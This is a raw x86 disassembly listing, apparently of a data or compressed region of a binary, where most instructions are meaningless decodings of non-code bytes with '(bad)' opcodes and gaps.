  429680:	bound  ebx,QWORD PTR [edx+edi*1]
  429683:	fidiv  DWORD PTR [eax-0x46]
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	cmp    ecx,edx
  42968e:	test   bl,al
  429690:	aad    0xad
  429692:	sbb    eax,0xa2e2e356
  429697:	aad    0xa0
  429699:	jae    0x429686
  42969b:	das    
  42969c:	iret   
  42969d:	and    al,0x92
  42969f:	mov    ss,WORD PTR [ecx]
  4296a1:	pop    ecx
  4296a2:	wrmsr  
  4296a4:	call   0x68d9:0x86be011
  4296ab:	inc    eax
  4296ac:	lahf   
  4296ad:	mov    ah,0xdc
  4296af:	loope  0x429691
  4296b1:	stc    
  4296b2:	and    eax,0x8e7b0782
  4296b7:	in     al,0xdc
  4296b9:	enter  0x1308,0x14
  4296bd:	lea    di,[eax+edi*2]
  4296c1:	pop    ss
  4296c2:	fwait
  4296c3:	sar    ebx,0x94
  4296c6:	xchg   esi,eax
  4296c7:	fst    st(7)
  4296c9:	ss sub al,al
  4296cc:	retf   0x29f6
  4296cf:	sbb    edx,ebp
  4296d1:	pop    es
  4296d2:	inc    esp
  4296d3:	xchg   edx,eax
  4296d4:	xchg   DWORD PTR [ebp+0x3087b5f4],esp
  4296da:	pusha  
  4296db:	inc    ebx
  4296dc:	pushf  
  4296dd:	adc    DWORD PTR [edx+0x6d811f2a],0x50
  4296e4:	and    eax,0x3b4c0f12
  4296e9:	mov    WORD PTR [edi],ss
  4296eb:	test   DWORD PTR [esi],0x52c42b23
  4296f1:	repnz aaa 
  4296f3:	push   0x1e
  4296f5:	adc    DWORD PTR [edx+0x6],ebp
  4296f8:	add    al,0x40
  4296fa:	not    DWORD PTR [edx-0x6a]
  4296fd:	outs   dx,DWORD PTR ds:[esi]
  4296fe:	add    BYTE PTR [eax-0x48a1eeb7],0xc5
  429705:	and    al,0xa9
  429707:	jl     0x429708
  429709:	hlt    
  42970a:	nop
  42970b:	ins    BYTE PTR es:[edi],dx
  42970c:	mov    dl,0x88
  42970e:	mov    dl,0x78
  429710:	pop    edx
  429711:	jle    0x429733
  429713:	mov    al,ds:0x4949ad9a
  429718:	in     eax,0xa5
  42971a:	push   0xffffffc8
  42971c:	test   eax,0x1cd8593e
  429721:	out    dx,eax
  429722:	retf   0xe72
  429725:	div    cl
  429727:	hlt    
  429728:	push   eax
  429729:	jmp    0x13169d1
  42972e:	sar    cl,1
  429730:	jmp    0x4bd8:0x3000b494
  429737:	out    dx,eax
  429738:	and    BYTE PTR [ebp-0x404247cf],ch
  42973e:	mov    ds:0x3db8b3b1,al
  429743:	xor    ah,bl
  429745:	xor    DWORD PTR [ecx+0x35268fe4],esp
  42974b:	mov    esi,0x32961280
  429750:	xor    eax,0x35c74b6e
  429755:	adc    DWORD PTR fs:[ebx-0x15262d96],esi
  42975c:	dec    esi
  42975d:	adc    esp,edi
  42975f:	mov    eax,ds:0x8feda302
  429764:	loope  0x4297c1
  429766:	ror    BYTE PTR [ecx-0x2a9eda6d],0x63
  42976d:	sub    dh,BYTE PTR [ebx-0x2b]
  429770:	push   0xb253fe4
  429775:	lds    esp,FWORD PTR [edi+0x38098d5f]
  42977b:	push   esp
  42977c:	(bad)  
  42977d:	fs cmp eax,0xb1f1af95
  429783:	mov    ebx,esi
  429785:	cwde   
  429786:	add    dh,BYTE PTR [eax]
  429788:	repz xchg edx,eax
  42978a:	aam    0x67
  42978c:	jo     0x429766
  42978e:	aaa    
  42978f:	scas   al,BYTE PTR es:[edi]
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	adc    al,0x57
  429802:	jle    0x42986c
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	mov    esi,0xefc3c588
  429811:	cwde   
  429812:	ret    
  429813:	mov    dh,0xee
  429815:	mov    cl,0x1d
  429817:	adc    al,0xf0
  429819:	sbb    BYTE PTR [edi+eiz*1-0x920ed0e],cl
  429820:	pop    ebp
  429821:	cli    
  429822:	push   eax
  429823:	and    ah,ah
  429825:	add    al,BYTE PTR [ebx+0x19]
  429828:	sbb    DWORD PTR [esi+0x420cd3d6],0x8e206889
  429832:	ror    DWORD PTR [ecx+0x2d],1
  429835:	stos   BYTE PTR es:[edi],al
  429836:	loopne 0x429885
  429838:	adc    DWORD PTR [ecx],esi
  42983a:	pop    ss
  42983b:	jmp    0x3ab4d5cb
  429840:	loopne 0x429893
  429842:	add    DWORD PTR [eax-0x1b],eax
  429845:	fstp   DWORD PTR [edi-0x380d8e57]
  42984b:	and    eax,0x54ecef5b
  429850:	jp     0x429832
  429852:	fnstenv ds:[eax]
  429855:	sub    BYTE PTR [edx+0x70],ah
  429858:	pop    ebp
  429859:	pop    ebp
  42985a:	sub    esi,DWORD PTR [ecx-0x470850fd]
  429860:	push   ebx
  429861:	fadd   QWORD PTR [esi+eax*2-0xf]
  429865:	xchg   ecx,eax
  429866:	arpl   WORD PTR ds:0x9d588db,si
  42986c:	ret    0xa754
  42986f:	repz push ss
  429871:	into   
  429872:	repnz cmp al,0x9
  429875:	pop    ebx
  429876:	mov    fs,eax
  429878:	je     0x429889
  42987a:	jmp    0xa767ac56
  42987f:	jno    0x42981c
  429881:	mov    al,0xee
  429883:	into   
  429884:	es scas al,BYTE PTR es:[edi]
  429886:	and    DWORD PTR [edi],ebx
  429888:	and    BYTE PTR [esi+0x11],dl
  42988b:	inc    ebx
  42988c:	clc    
  42988d:	jl     0x4298f2
  42988f:	add    ecx,edi
  429891:	mov    ebp,0x7fea4ad1
  429896:	daa    
  429897:	inc    ecx
  429898:	retf   0xb3e7
  42989b:	sar    BYTE PTR [edi+0x3],cl
  42989e:	jp     0x42988c
  4298a0:	and    BYTE PTR [eax],cl
  4298a2:	out    0xf2,eax
  4298a4:	aas    
  4298a5:	jmp    0x47ac:0x63cc443d
  4298ac:	(bad)  
  4298ad:	les    edx,FWORD PTR [edx-0x8]
  4298b0:	int3   
  4298b1:	adc    ch,dh
  4298b3:	xchg   ebx,eax
  4298b4:	addr16 int 0x85
  4298b7:	adc    esi,DWORD PTR [edi]
  4298b9:	lds    eax,FWORD PTR [edi-0x57bf35fe]
  4298bf:	cmp    al,0x8e
  4298c1:	mov    ah,0x2c
  4298c3:	out    dx,eax
  4298c4:	rol    DWORD PTR [ebp-0x5d],1
  4298c7:	fwait
  4298c8:	pop    ss
  4298c9:	xor    eax,0xee51e3f0
  4298ce:	mov    ebp,0x62b80f14
  4298d3:	xchg   DWORD PTR [ebx],esi
  4298d5:	shl    edi,1
  4298d7:	jp     0x429893
  4298d9:	mov    ebp,0xb8e4c10f
  4298de:	jp     0x429872
  4298e0:	lea    edi,[esi+0x5f]
  4298e3:	inc    edx
  4298e4:	ds sbb al,0xe4
  4298e7:	fdivr  DWORD PTR [ecx-0x31]
  4298ea:	out    dx,eax
  4298eb:	jno    0x429940
  4298ed:	inc    esp
  4298ee:	mov    bh,0xa9
  4298f0:	ins    BYTE PTR es:[edi],dx
  4298f1:	jo     0x4298f3
  4298f3:	xchg   ecx,eax
  4298f4:	outs   dx,BYTE PTR ds:[esi]
  4298f5:	jae    0x4298a2
  4298f7:	scas   al,BYTE PTR es:[edi]
  4298f8:	in     al,0x72
  4298fa:	ja     0x4298aa
  4298fc:	enter  0x87f,0x66
  429900:	fmul   DWORD PTR [ecx]
  429902:	cdq    
  429903:	stos   DWORD PTR es:[edi],eax
  429904:	adc    ah,BYTE PTR [esi+0x51]
  429907:	popa   
  429908:	popf   
  429909:	shr    BYTE PTR [ebx+0x2c848207],1
  42990f:	xchg   BYTE PTR [eax],al
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	fisttp DWORD PTR [edi]
  429982:	mov    eax,ds:0x1bc7852
  429987:	add    BYTE PTR [ecx+eax*1],al
  42998a:	add    BYTE PTR [eax],al
  42998c:	mov    eax,0xcb9cfa1d
  429991:	(bad)  
  429992:	(bad)  
  429993:	mov    esp,0x6d195a11
  429998:	xchg   edi,eax
  429999:	sbb    DWORD PTR [esi],eax
  42999b:	push   ecx
  42999c:	std    
  42999d:	push   ecx
  42999e:	adc    ch,BYTE PTR ds:0x4ae0ee79
  4299a4:	shr    BYTE PTR [esi+0x5bab87ee],1
  4299aa:	and    eax,0x63734865
  4299af:	adc    BYTE PTR [ecx-0x7b],bl
  4299b2:	stos   BYTE PTR es:[edi],al
  4299b3:	nop
  4299b4:	mov    ecx,0xb2d71c60
  4299b9:	xlat   BYTE PTR ds:[ebx]
  4299ba:	mov    esi,0xfd83f02
  4299bf:	jl     0x4299d8
  4299c1:	(bad)  
  4299c2:	out    0xda,eax
  4299c4:	mov    ch,0x92
  4299c6:	je     0x4299bd
  4299c8:	int    0x8b
  4299ca:	stos   BYTE PTR es:[edi],al
  4299cb:	cmp    DWORD PTR [eax+0x47],edx
  4299ce:	(bad)  
  4299cf:	xor    eax,0x83e9a8cf
  4299d4:	xor    al,ch
  4299d6:	pusha  
  4299d7:	gs mov ebx,0x68a3091d
  4299dd:	jge    0x4299e3
  4299df:	inc    eax
  4299e0:	dec    edi
  4299e1:	xor    al,BYTE PTR [ecx-0x1d404f71]
  4299e7:	push   esi
  4299e8:	je     0x429a24
  4299ea:	adc    dh,BYTE PTR [esi]
  4299ec:	mov    bl,0xc6
  4299ee:	loop   0x429a45
  4299f0:	aaa    
  4299f1:	inc    edx
  4299f2:	ja     0x429a1a
  4299f4:	repz into 
  4299f6:	dec    ebp
  4299f7:	arpl   WORD PTR [edx+0x30],sp
  4299fa:	sub    ebx,eax
  4299fc:	mov    bl,0xba
  4299fe:	sbb    al,0x7b
  429a00:	jecxz  0x4299aa
  429a02:	imul   ecx,DWORD PTR [edx+eax*8],0xfb8cf380
  429a09:	jle    0x4299b1
  429a0b:	add    al,0x46
  429a0d:	cmp    dl,BYTE PTR [ebx+ebx*2+0x64ad1514]
  429a14:	or     DWORD PTR [ebp-0x42],esp
  429a17:	ds sti 
  429a19:	jmp    DWORD PTR ds:0x950026fc
  429a1f:	xchg   DWORD PTR [edx-0x15036916],edi
  429a25:	rcr    DWORD PTR [ebp+0x5d],0x40
  429a29:	push   ebx
  429a2a:	sub    al,0x2a
  429a2c:	dec    esi
  429a2d:	cld    
  429a2e:	sbb    esp,DWORD PTR [edi+esi*2-0x3cc4967c]
  429a35:	adc    eax,0x5762f573
  429a3a:	mov    ecx,0x75c42ede
  429a3f:	ja     0x429a9c
  429a41:	ror    BYTE PTR [ebx+ebp*2],1
  429a44:	addr16 call 0x62a2:0x66a72a95
  429a4c:	sti    
  429a4d:	mov    ds:0xbbc7026f,eax
  429a52:	push   0xa218a6fd
  429a57:	(bad)  
  429a58:	xchg   ebx,eax
  429a59:	push   edx
  429a5a:	adc    ch,ah
  429a5c:	sbb    DWORD PTR [eax-0xb],ecx
  429a5f:	xchg   esi,eax
  429a60:	dec    esp
  429a61:	fs sbb al,0x97
  429a64:	sysret 
  429a66:	adc    esp,DWORD PTR [ecx-0x2c2f18a5]
  429a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a6d:	shl    DWORD PTR [esi],1
  429a6f:	std    
  429a70:	ficom  WORD PTR [eax]
  429a72:	cmp    al,0xeb
  429a74:	int3   
  429a75:	cmp    al,0x9b
  429a77:	pop    esi
  429a78:	mov    ?,WORD PTR [ecx]
  429a7a:	adc    al,0x32
  429a7c:	add    ebp,esi
  429a7e:	jmp    0x429a84
  429a80:	xchg   esi,eax
  429a81:	stc    
  429a82:	out    0xc8,eax
  429a84:	or     ebx,ecx
  429a86:	xor    al,0x40
  429a88:	cmp    bh,cl
  429a8a:	daa    
  429a8b:	inc    edi
  429a8c:	out    dx,al
  429a8d:	sub    al,0x55
  429a8f:	aam    0x0
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x80a95667
  429b01:	sub    BYTE PTR [esi+0x1bd7cbf],bh
  429b07:	add    BYTE PTR [ecx+eax*1],al
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	(bad)  
  429b0d:	mov    esp,0xfc6564a2
  429b12:	push   ebp
  429b13:	jne    0x429b21
  429b15:	jmp    FWORD PTR [eax]
  429b17:	adc    esp,DWORD PTR [esi]
  429b19:	xor    DWORD PTR [edx+0x727a507f],eax
  429b1f:	(bad)  
  429b20:	ja     0x429b86
  429b22:	jno    0x429b58
  429b24:	xor    ebp,ebp
  429b26:	mov    ebx,0x48d3c987
  429b2b:	(bad)  
  429b2c:	cmp    edi,DWORD PTR [ebp+0x64]
  429b2f:	into   
  429b30:	jns    0x429ac2
  429b32:	arpl   WORD PTR [ebp+esi*1+0x70],cx
  429b36:	pop    edx
  429b37:	in     eax,0x89
  429b39:	jno    0x429aec
  429b3b:	rcr    DWORD PTR [edx-0x14875a12],1
  429b41:	mov    ecx,0x73153044
  429b46:	xchg   ecx,eax
  429b47:	cmc    
  429b48:	adc    DWORD PTR ds:0xd1f2b2b6,ecx
  429b4e:	leave  
  429b4f:	dec    edx
  429b50:	or     edx,DWORD PTR [esp+esi*8]
  429b53:	imul   ecx,DWORD PTR [ebp+eiz*4+0x3e],0xffffff9a
  429b58:	out    0xcb,eax
  429b5a:	adc    BYTE PTR [edx],al
  429b5c:	cmp    esp,ebx
  429b5e:	pop    eax
  429b5f:	stos   BYTE PTR es:[edi],al
  429b60:	mov    eax,0x6606a308
  429b65:	cmp    DWORD PTR [eax],ebp
  429b67:	adc    eax,0x8f2d5292
  429b6c:	or     DWORD PTR [eax-0x2a],ebp
  429b6f:	imul   di,WORD PTR [edx+0x1a],0x18
  429b74:	ins    BYTE PTR es:[edi],dx
  429b75:	and    BYTE PTR gs:[edi+0x6a21776e],ch
  429b7c:	(bad)  
  429b7e:	mov    eax,0xa23b728c
  429b83:	stos   DWORD PTR es:[edi],eax
  429b84:	in     al,dx
  429b85:	call   FWORD PTR [ecx+0x7]
  429b88:	cmp    esi,esp
  429b8a:	ins    BYTE PTR es:[edi],dx
  429b8b:	jne    0x429b7c
  429b8d:	lock test eax,0x4c11ebb8
  429b93:	mov    ebx,0xf51b078c
  429b98:	sub    BYTE PTR [edx-0x62d54303],al
  429b9e:	or     bl,BYTE PTR [eax-0x787edb9d]
  429ba4:	jne    0x429bd4
  429ba6:	repnz mov cl,0x4f
  429ba9:	fsubr  QWORD PTR [ebx-0xd361acd]
  429baf:	mov    ebx,0xbd168ad
  429bb4:	mov    esp,?
  429bb6:	or     ah,BYTE PTR [ecx+0x6e5c0a4d]
  429bbc:	mov    al,0x80
  429bbe:	push   es
  429bbf:	mov    edx,0x6fd08d69
  429bc4:	mov    eax,esp
  429bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bc7:	push   0xfffffff5
  429bc9:	stos   BYTE PTR es:[edi],al
  429bca:	xchg   ebx,eax
  429bcb:	scas   al,BYTE PTR es:[edi]
  429bcc:	(bad)  
  429bcd:	in     eax,dx
  429bce:	stc    
  429bcf:	pop    ebx
  429bd0:	test   eax,0x7a1f7c92
  429bd6:	add    ebx,edi
  429bd8:	push   esp
  429bd9:	rol    DWORD PTR [esi],0x1
  429bdc:	inc    edi
  429bdd:	and    eax,0x28efee7c
  429be2:	retf   
  429be3:	mov    DWORD PTR [eax+edi*1+0x59],ebx
  429be7:	pop    ebp
  429be8:	retf   0x19b6
  429beb:	xor    DWORD PTR [edx-0x1e1f387e],ecx
  429bf1:	cmp    BYTE PTR ds:0x62a038c8,bl
  429bf7:	test   DWORD PTR [ebx],ecx
  429bf9:	xchg   ecx,eax
  429bfa:	mov    bl,0x2f
  429bfc:	push   0x7cb25894
  429c01:	cmp    al,0xc9
  429c03:	cld    
  429c04:	in     eax,0x13
  429c06:	mov    eax,0x630607c6
  429c0b:	stos   DWORD PTR es:[edi],eax
  429c0c:	aaa    
  429c0d:	aam    0x4
  429c0f:	out    dx,eax
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ecx+ecx*2],al
  429c82:	push   cs
  429c83:	push   ebx
  429c84:	cmp    BYTE PTR [esi+0x1040001],0x0
  429c8b:	add    BYTE PTR [edx],dh
  429c8d:	mov    ebp,0xcd510ece
  429c92:	inc    ebp
  429c93:	jle    0x429c21
  429c95:	ret    
  429c96:	js     0x429d16
  429c98:	xor    bh,BYTE PTR [esi-0x7d]
  429c9b:	cmp    ch,BYTE PTR [edi+esi*8+0x47]
  429c9f:	xchg   BYTE PTR ds:0xd2cb53eb,dh
  429ca5:	hlt    
  429ca6:	pop    ebp
  429ca7:	pop    ebp
  429ca8:	mov    DWORD PTR [ebx],esp
  429caa:	fwait
  429cab:	jg     0x429c9b
  429cad:	test   eax,0x6d167907
  429cb2:	loop   0x429c66
  429cb4:	jnp    0x429c8c
  429cb6:	inc    edi
  429cb7:	pushf  
  429cb8:	(bad)  
  429cb9:	jne    0x429cce
  429cbb:	outs   dx,DWORD PTR ds:[esi]
  429cbc:	int3   
  429cbd:	and    bl,bl
  429cbf:	mov    esp,DWORD PTR [esi]
  429cc1:	(bad)  
  429cc2:	test   eax,0xf5280e1
  429cc7:	retf   0x347b
  429cca:	add    ecx,DWORD PTR [edx]
  429ccc:	loope  0x429ccc
  429cce:	aaa    
  429ccf:	(bad)  
  429cd1:	jae    0x429cab
  429cd3:	dec    esp
  429cd4:	call   0xa63e5814
  429cd9:	pop    eax
  429cda:	xor    al,BYTE PTR [edi-0x7369410c]
  429ce0:	mov    al,0xe7
  429ce2:	(bad)  
  429ce3:	mov    eax,ds:0x6e8df1fc
  429ce8:	mov    bl,0x24
  429cea:	push   ecx
  429ceb:	jl     0x429cb9
  429ced:	pushf  
  429cee:	scas   al,BYTE PTR es:[edi]
  429cef:	jecxz  0x429c97
  429cf1:	jb     0x429d61
  429cf3:	imul   ebx,DWORD PTR [edi-0x3ceb2724],0x75
  429cfa:	jmp    0x22aeccc1
  429cff:	jmp    0x429d66
  429d01:	je     0x429cbb
  429d03:	les    ebp,FWORD PTR [ecx+0x7df26c5a]
  429d09:	cwde   
  429d0a:	adc    BYTE PTR [ecx-0x2],dh
  429d0d:	jg     0x429d09
  429d0f:	jmp    0x5cb742ab
  429d14:	das    
  429d15:	hlt    
  429d16:	mov    ?,WORD PTR [ecx+ecx*4-0x1c]
  429d1a:	sub    edx,edx
  429d1c:	sbb    BYTE PTR [eax+0x490ce311],al
  429d22:	scas   al,BYTE PTR es:[edi]
  429d23:	ja     0x429d02
  429d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d26:	fs es out dx,al
  429d29:	mov    al,0x0
  429d2b:	scas   al,BYTE PTR es:[edi]
  429d2c:	icebp  
  429d2d:	jo     0x429cfa
  429d2f:	add    cl,ch
  429d31:	ret    0xb3c9
  429d34:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  429d36:	mov    cl,0x96
  429d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d39:	xor    ch,dl
  429d3b:	dec    edi
  429d3c:	test   DWORD PTR ds:0xf9338b18,ebx
  429d42:	mov    cl,0x66
  429d44:	sub    eax,0x1d9397b
  429d49:	adc    ebp,ebx
  429d4b:	add    eax,0xc671d447
  429d50:	mov    dl,ah
  429d52:	inc    edx
  429d53:	outs   dx,DWORD PTR ds:[esi]
  429d54:	xor    DWORD PTR [ebp+0x79],edi
  429d57:	pop    edx
  429d58:	aas    
  429d59:	ja     0x429ce0
  429d5b:	repnz loopne 0x429d1b
  429d5e:	cmp    eax,0xefc19184
  429d63:	stos   BYTE PTR es:[edi],al
  429d64:	inc    ebx
  429d65:	cld    
  429d66:	inc    edi
  429d67:	imul   eax,DWORD PTR ds:0xbcfbe0a,0xe57b71f0
  429d71:	je     0x429d03
  429d73:	bound  esi,QWORD PTR [ebp-0x40]
  429d76:	ffreep st(2)
  429d78:	int3   
  429d79:	inc    ecx
  429d7a:	sbb    cl,BYTE PTR [ecx]
  429d7c:	xchg   ebp,eax
  429d7d:	shl    BYTE PTR ss:[ecx+ecx*4+0x92bae95],0x50
  429d86:	adc    ecx,DWORD PTR [ecx]
  429d88:	sub    eax,0x7d201579
  429d8d:	mov    ah,BYTE PTR [ecx-0x60]
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	adc    ebp,DWORD PTR [edx-0x1e]
  429e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e04:	test   BYTE PTR [edi+0x1040001],bh
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	mov    DWORD PTR [eax+0x43048832],eax
  429e12:	addr16 retf 
  429e14:	push   cs
  429e15:	adc    DWORD PTR [edi+ecx*2],edi
  429e18:	es stc 
  429e1a:	fsubr  st(5),st
  429e1c:	adc    ebp,ebx
  429e1e:	stos   DWORD PTR es:[edi],eax
  429e1f:	pop    eax
  429e20:	and    esp,DWORD PTR [esp+eax*8-0x36398671]
  429e27:	lahf   
  429e28:	add    eax,0x537396f4
  429e2d:	in     al,dx
  429e2e:	mov    ah,0x48
  429e30:	ds clc 
  429e32:	jmp    0x429eb1
  429e34:	(bad)
  429e37:	sub    esp,0xffffff94
  429e3a:	les    edx,FWORD PTR [ebp+edi*8+0x4eddfd6a]
  429e41:	or     BYTE PTR [eax],bh
  429e43:	mov    dh,0xb8
  429e45:	inc    ebx
  429e46:	in     al,dx
  429e47:	add    al,0xe6
  429e49:	and    DWORD PTR [esi],ebp
  429e4b:	(bad)
  429e4f:	jp     0x429dea
  429e51:	pop    esp
  429e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e53:	mov    dl,0x96
  429e55:	dec    esp
  429e56:	lods   eax,DWORD PTR ds:[esi]
  429e57:	add    al,0x6c
  429e59:	test   al,0xf2
  429e5b:	nop
  429e5c:	call   0x6b347a62
  429e61:	push   eax
  429e62:	aas    
  429e63:	and    DWORD PTR [ecx],0xd8d54e15
  429e69:	cdq    
  429e6a:	sbb    eax,0x87ae24bb
  429e6f:	pop    esi
  429e70:	jae    0x429e88
  429e72:	int3   
  429e73:	xchg   ebp,eax
  429e74:	adc    eax,0xa1b51bf5
  429e79:	push   es
  429e7a:	(bad)  
  429e7b:	mov    bh,0x78
  429e7d:	shl    cl,cl
  429e7f:	(bad)  
  429e81:	std    
  429e82:	mov    dh,BYTE PTR [ebx]
  429e84:	addr16 push 0xffffff95
  429e87:	jae    0x429ef1
  429e89:	sbb    al,BYTE PTR [edi-0x71ef410d]
  429e8f:	sbb    BYTE PTR [edi],al
  429e91:	test   BYTE PTR [esi*4-0x12b15cef],ah
  429e98:	in     eax,0xd8
  429e9a:	pop    ds
  429e9b:	xor    al,0x13
  429e9d:	jmp    0x429e5b
  429e9f:	hlt    
  429ea0:	mov    ds:0x3cdfc114,al
  429ea5:	pop    esp
  429ea6:	xlat   BYTE PTR ds:[ebx]
  429ea7:	pop    eax
  429ea8:	dec    edx
  429ea9:	jb     0x429ea9
  429eab:	xor    bh,bl
  429ead:	cmc    
  429eae:	rcr    BYTE PTR [edi+0x2d],cl
  429eb1:	or     bh,ah
  429eb3:	sbb    eax,0xe819dba6
  429eb8:	clc    
  429eb9:	mov    esp,0x9d2ff4dd
  429ebe:	pop    edi
  429ebf:	cmp    eax,0xc6e0caa1
  429ec4:	xchg   esp,eax
  429ec5:	sub    eax,0x356378a3
  429eca:	jo     0x429f0a
  429ecc:	icebp  
  429ecd:	mov    DWORD PTR [eax],edi
  429ecf:	xor    eax,0xf4062c9d
  429ed4:	dec    eax
  429ed5:	je     0x429eca
  429ed7:	jecxz  0x429ef4
  429ed9:	adc    DWORD PTR [ebx],ebx
  429edb:	fidivr WORD PTR [edi+0x32]
  429ede:	shr    DWORD PTR [esi+0x34],1
  429ee1:	(bad)  
  429ee2:	lahf   
  429ee3:	div    BYTE PTR [ebx+edx*4-0x236d2da4]
  429eea:	and    ebx,DWORD PTR [edx-0x33]
  429eed:	in     eax,dx
  429eee:	inc    eax
  429eef:	retf   0xd61b
  429ef2:	mov    bl,0x65
  429ef4:	stos   BYTE PTR es:[edi],al
  429ef5:	mov    bl,0x7c
  429ef7:	dec    ecx
  429ef8:	dec    eax
  429ef9:	in     al,0x49
  429efb:	pop    eax
  429efc:	loope  0x429f44
  429efe:	add    ecx,ebx
  429f00:	leave  
  429f01:	les    esp,FWORD PTR [esi-0xe5fe134]
  429f07:	jmp    0x429ef7
  429f09:	outs   dx,DWORD PTR ds:[esi]
  429f0a:	xor    BYTE PTR [esi-0x75],bl
  429f0d:	mov    ds:0x155e,eax
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x7391c1e0]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	mov    ah,0x7c
  429f8e:	pop    ebx
  429f8f:	jg     0x429f84
  429f91:	sub    eax,0x8fcb61bf
  429f96:	jle    0x429ff4
  429f98:	enter  0x76b1,0x57
  429f9c:	sub    esi,DWORD PTR [ebp-0xeb1919]
  429fa2:	add    BYTE PTR [edx+0xce5a8b6],bh
  429fa8:	push   edx
  429fa9:	push   cs
  429faa:	or     DWORD PTR [eax],esi
  429fac:	mov    ebp,0x8707f1a8
  429fb1:	imul   ecx,DWORD PTR [edx+0x7da38eeb],0xa54df4
  429fbb:	ror    BYTE PTR [eax+0x3],cl
  429fbe:	mov    ebp,0xa2187d20
  429fc3:	sar    DWORD PTR [esi-0x31],0x77
  429fc7:	daa    
  429fc8:	or     al,0x49
  429fca:	cli    
  429fcb:	jnp    0x429f75
  429fcd:	mov    dh,0x34
  429fcf:	rcr    BYTE PTR [edx],0x4c
  429fd2:	sub    bl,BYTE PTR [ebp-0x30615f03]
  429fd8:	and    BYTE PTR [edx+0x5738e3ed],0x4e
  429fdf:	aas    
  429fe0:	sar    bl,0x4f
  429fe3:	test   eax,0xbda4cde3
  429fe8:	ret    
  429fe9:	enter  0x5349,0xaa
  429fed:	je     0x429f96
  429fef:	icebp  
  429ff0:	xchg   BYTE PTR [eiz*2+0x5f5fda70],cl
  429ff7:	clc    
  429ff8:	aaa    
  429ff9:	xor    ah,dl
  429ffb:	sti    
  429ffc:	push   edx
  429ffd:	dec    edx
  429ffe:	mov    bl,0x7f
  42a000:	rcr    bh,cl
  42a002:	cwde   
  42a003:	add    ebp,ebp
  42a005:	jl     0x42a01f
  42a007:	ret    
  42a008:	out    0x19,eax
  42a00a:	push   ecx
  42a00b:	mov    ds:0xbdc1b5fa,eax
  42a010:	push   es
  42a011:	mov    dh,0xc7
  42a013:	pop    ebp
  42a014:	jecxz  0x42a030
  42a016:	cmp    edx,DWORD PTR [ecx-0x110d811b]
  42a01c:	call   0xb701:0x13299803
  42a023:	stos   BYTE PTR es:[edi],al
  42a024:	hlt    
  42a025:	jmp    0xd06:0x1fea5cd7
  42a02c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a02d:	call   0xcbba:0x79d214f6
  42a034:	shl    BYTE PTR [ecx-0x4],0x5c
  42a038:	cmp    eax,0xbb14484e
  42a03d:	mov    WORD PTR [edx+ebx*4-0x700b76d1],ds
  42a044:	loopne 0x42a07a
  42a046:	inc    esi
  42a047:	mov    ds:0x5609afc8,al
  42a04c:	sub    ah,dl
  42a04e:	mov    bh,BYTE PTR [ecx-0x73]
  42a051:	jne    0x429fdf
  42a053:	inc    ecx
  42a054:	ins    DWORD PTR es:[edi],dx
  42a055:	std    
  42a056:	or     BYTE PTR ds:0x6405b1c7,cl
  42a05c:	mov    dl,0xab
  42a05e:	mov    al,ds:0xc574ec1a
  42a063:	lahf   
  42a064:	lock sub al,0x61
  42a067:	and    eax,0x664648e4
  42a06c:	inc    eax
  42a06d:	scas   al,BYTE PTR es:[edi]
  42a06e:	loop   0x42a0d8
  42a070:	aas    
  42a071:	pop    ebx
  42a072:	aad    0xd
  42a074:	inc    ebp
  42a075:	inc    edi
  42a076:	push   0x6b
  42a078:	or     ch,cl
  42a07a:	dec    ebp
  42a07b:	add    ecx,DWORD PTR [edi-0x5e]
  42a07e:	std    
  42a07f:	mov    cl,0xfe
  42a081:	lods   al,BYTE PTR ds:[esi]
  42a082:	xor    BYTE PTR [ebx-0x6b],al
  42a085:	add    BYTE PTR [eax+ebp*1-0x24246c17],al
  42a08c:	ins    DWORD PTR es:[edi],dx
  42a08d:	sub    ebp,DWORD PTR [eax]
  42a08f:	fiadd  WORD PTR [eax]
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	sbb    BYTE PTR [edx-0xe],dl
